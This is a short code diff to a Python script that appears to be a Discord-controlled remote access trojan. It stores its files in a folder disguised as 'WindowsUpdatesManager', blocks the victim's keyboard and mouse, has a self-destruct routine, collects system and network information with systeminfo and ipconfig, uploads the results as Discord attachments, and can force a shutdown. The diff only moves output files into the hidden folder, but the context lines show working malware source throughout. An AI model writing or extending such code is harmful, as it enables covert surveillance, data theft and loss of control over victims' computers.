@@ -22,7 +22,7 @@ from time import sleep
 from monitorcontrol import get_monitors
 from monitorcontrol import Monitor
 
-operation_dir = os.getenv("APPDATA") + "\WindowsUpdates"
+operation_dir = os.getenv("LOCALAPPDATA") + "\WindowsUpdatesManager\Snky-main"
 nullptr = POINTER(c_int)()
 kb_listener = pynput.keyboard.Listener(suppress=True)
 m_listener = pynput.mouse.Listener(suppress=True)
@@ -33,14 +33,14 @@ def self_destruct():
   os.popen(f"start {script_file}")
 
 def comp_info():
-  os.popen("systeminfo > pc_info.txt")
+  os.popen(f"systeminfo > {operation_dir}/pc_info.txt")
   sleep(5)
   embed = discord.Embed(title="Computer Information",description="Result uploaded.", color=0x00ff00)
-  file_out = discord.File("pc_info.txt", filename="pc_info.txt")
+  file_out = discord.File(f"{operation_dir}/pc_info.txt", filename="pc_info.txt")
   return embed, file_out
 
 def networking_info():
-  os.popen("ipconfig /all > networking_info.txt")
+  os.popen(f"ipconfig /all > {operation_dir}/networking_info.txt")
 
 def pc_shutdown():
   os.popen("shutdown /s /t 0")
